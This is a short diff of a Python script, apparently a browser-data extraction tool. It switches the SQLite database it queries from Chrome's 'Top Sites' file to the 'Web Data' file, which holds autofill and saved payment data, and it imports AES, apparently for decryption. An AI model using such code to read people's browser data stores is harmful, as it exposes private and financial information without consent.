@@ -8,7 +8,7 @@ from Crypto.Cipher import AES
 db_top_sites = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Top Sites")
 
 db = db_top_sites
-#db = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Web Data")
+db = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Web Data")
         
 def exec_query(query):
     try:
